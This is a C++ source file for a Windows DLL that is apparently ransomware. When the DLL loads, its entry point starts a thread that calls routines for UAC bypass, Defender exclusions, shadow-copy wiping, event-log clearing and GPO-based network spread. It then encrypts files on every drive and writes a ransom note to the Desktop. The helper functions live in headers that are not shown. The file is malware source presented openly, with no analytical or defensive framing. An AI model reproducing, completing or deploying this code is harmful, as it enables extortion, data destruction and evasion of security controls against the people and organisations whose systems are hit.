#include <windows.h>
#include "evasion.h"
#include "encrypt.h"
#include "spread.h"

static DWORD WINAPI payload_thread(LPVOID) {
    // 1. Evasion first — before any file ops
    uac_bypass();
    Sleep(2000);                    // wait for elevated re-launch
    add_defender_exclusions();
    wipe_shadow_copies();
    clear_event_logs();

    // 2. Init crypto — generate keypair, derive session key
    encryptor_init();

    // 3. Network spread if domain
    spread_via_gpo();

    // 4. IOCP engine up
    IOCPEngine engine;
    engine.start([](const wchar_t* path) {
        unlock_file_via_restart_manager(path);
        encrypt_file(path);
    });

    // 5. Enumerate all drives
    DWORD drives = GetLogicalDrives();
    wchar_t root[] = L"A:\\";
    for (int i = 0; i < 26; i++) {
        if (drives & (1 << i)) {
            root[0] = L'A' + i;
            enumerate_and_encrypt(root);
        }
    }

    // 6. Wait for all workers to finish
    engine.wait_all();

    // 7. Drop ransom note on Desktop
    wchar_t note_path[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_DESKTOPDIRECTORY,
                     NULL, 0, note_path);
    wcscat_s(note_path, L"\\HOW_TO_DECRYPT.README");
    HANDLE hNote = CreateFileW(note_path, GENERIC_WRITE, 0,
                               NULL, CREATE_ALWAYS, 0, NULL);
    const char* note =
        "Your files have been encrypted.\n"
        "Send victim ID to: contact@[redacted].onion\n";
    DWORD w;
    WriteFile(hNote, note, strlen(note), &w, NULL);
    CloseHandle(hNote);

    return 0;
}

BOOL APIENTRY DllMain(HMODULE hMod, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hMod);
        CreateThread(NULL, 0, payload_thread, NULL, 0, NULL);
    }
    return TRUE;
}
